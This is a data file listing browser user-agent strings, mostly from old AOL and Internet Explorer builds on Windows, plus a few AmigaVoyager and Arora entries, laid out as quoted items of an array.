'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; InfoPath.1; HbTools 4.8.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 3.1]',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.1.4322; HbTools 4.7.1)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 3.1)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; FunWebProducts; (R1 1.5); HbTools 4.7.7)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; FunWebProducts)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows 98)',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322]',
'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; InfoPath.1]',
'AmigaVoyager/3.2 (AmigaOS/MC680x0)',
'AmigaVoyager/2.95 (compatible; MC680x0; AmigaOS; SV1)',
'AmigaVoyager/2.95 (compatible; MC680x0; AmigaOS)',
'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5004; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5001; Windows NT 5.1; Trident/4.0',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5000; Windows NT 5.1; Trident/4.0; FunWebProducts)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5000; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5000; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.27; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.27; Windows NT 5.1; Trident/4.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.17; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.168; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8]',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.168; Windows NT 5.1; Trident/4.0; GTB7.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.130; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.130; Windows NT 5.1; Trident/4.0; FunWebProducts; GTB6.6; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; yie8',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.12; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.12; Windows NT 5.1; Trident/4.0; GTB6.3',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.124; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.122; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8]',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.122; Windows NT 5.1; Trident/4.0; FunWebProducts)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.111; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.110; Windows NT 5.1; Trident/4.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.104; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.6; AOLBuild 4340.128; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.5; AOLBuild 4337.43; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.5; AOLBuild 4337.29; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.93; Windows NT 5.1; Trident/4.0; DigExt; .NET CLR 1.1.4322)',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.89; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.81; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.81; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618) (Compatible; ; ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.81; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.80; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.53; Windows NT 6.0; FunWebProducts; GTB6; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.43; Windows NT 6.0; WOW64; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.43; Windows NT 5.1; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.43; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.42; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 6.0; FunWebProducts; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 5.1; Trident/4.0; GTB6; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30618; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.1; AOLBuild 4334.5012; Windows NT 6.0; WOW64; Trident/5.0)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.1; AOLBuild 4334.5011; Windows NT 6.1; WOW64; Trident/4.0; GTB7.2; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5010; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5009; Windows NT 5.1; GTB5; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; Trident/4.0; DigExt; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; GTB5; .NET CLR 1.1.4322; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5000; Windows NT 5.1; Trident/4.0',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5000; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; InfoPath.1',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.36; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 5.1; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.27; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; Media Center PC 5.0); UnAuth-State',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.27; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506); UnAuth-State',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.27; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1); UnAuth-State',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4327.65535; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727); UnAuth-State',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30.',
'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.0; Windows NT 6.0; Trident/5.0)',
'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.0; AOLBuild 4327.5201; Windows NT 6.0; WOW64; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729)',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; InfoPath.2; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Trident/4.0; FunWebProducts; GTB6.4; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 1.1.4322; .NET CLR 3.5.30729; OfficeLiveConnector.1.3; OfficeLivePatch.0.0; .NET CLR 3.0.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Seekmo 10.0.406.0]',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; FunWebProducts; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; InfoPath.2; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; FunWebProducts; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Seekmo 10.0.341.0]',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; FunWebProducts; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; Trident/4.0; GTB6; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; InfoPath.1',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; OfficeLiveConnector.1.3; OfficeLivePatch.0.0',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 1.0.3705; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; FunWebProducts; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) )',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; GTB5; .NET CLR 1.1.4322; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.04506.30',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.04506.30',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.0.3705',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; YComp 5.0.0.0; .NET CLR 1.0.3705',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1; (R1 1.3); .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; Q312461',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts; SV1; .NET CLR 1.0.3705',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts; SV1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; .NET CLR 1.0.3705',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; (R1 1.3))',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.0',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; FunWebProducts',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1) (Compatible; ; ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; YComp 5.0.2.6; Hotbar 4.2.8.0.',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; YComp 5.0.2.4',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; YComp 5.0.0.0',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; SV1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Q312461; YComp 5.0.0.0',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Q312461',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Hotbar 4.2.8.0.',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; Hotbar 4.1.7.0',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; .NET CLR 1.0.3705',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.0',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows 98; Win 9x 4.90; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows 98; Win 9x 4.90; (R1 1.3))',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows 98; Win 9x 4.90',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 6.0; Windows NT 5.1',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98; Win 9x 4.90',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 98',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 6.0; Windows 95',
'Mozilla/4.0 (compatible; MSIE 5.0; AOL 6.0; Windows 98; DigExt; YComp 5.0.2.5',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 5.0; Windows NT 5.1',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 5.0; Windows 98; .NET CLR 1.1.4322',
'Mozilla/4.0 (compatible; MSIE 6.0; AOL 5.0; Windows 98',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows NT 5.0',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98; YComp 5.0.0.0',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98; Win 9x 4.90',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 98',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 5.0; Windows 95',
'Mozilla/4.0 (compatible; MSIE 5.0; AOL 5.0; Windows 98; DigExt',
'Mozilla/4.0 (compatible; MSIE 5.0; AOL 5.0; Windows 95; DigExt',
'Mozilla/4.0 (compatible; MSIE 5.0; AOL 5.0; Windows 95',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 4.0; Windows 98',
'Mozilla/4.0 (compatible; MSIE 5.5; AOL 4.0; Windows 95',
'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 98; DigExt',
'Mozilla/4.0 (compatible; MSIE 5.01; AOL 4.0; Windows 98',
'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 98',
'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 95',
'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Mac_68K',
'Mozilla/5.0 (X11; U; UNICOS lcLinux; en-US) Gecko/20140730 (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
'Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
'Mozilla/5.0 (Windows; U; ; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
'Mozilla/5.0 (Windows; U; ; en-EN) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
